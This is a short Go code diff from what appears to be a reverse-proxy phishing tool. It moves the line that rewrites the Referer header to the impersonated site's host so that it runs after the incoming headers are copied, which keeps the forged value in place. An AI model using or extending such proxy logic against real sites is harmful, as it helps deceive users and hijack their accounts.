@@ -102,11 +102,11 @@ func (p *PhishingProxy) copyRequest(request *http.Request) (*http.Request, error
 	if err != nil {
 		return nil, err
 	}
-	if request.Referer() != "" {
-		req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
-	}
 	for key, _ := range request.Header {
 		req.Header.Set(key, request.Header.Get(key))
+	}
+	if request.Referer() != "" {
+		req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
 	}
 	req.Header.Del("Accept-Encoding")
 	return req, nil
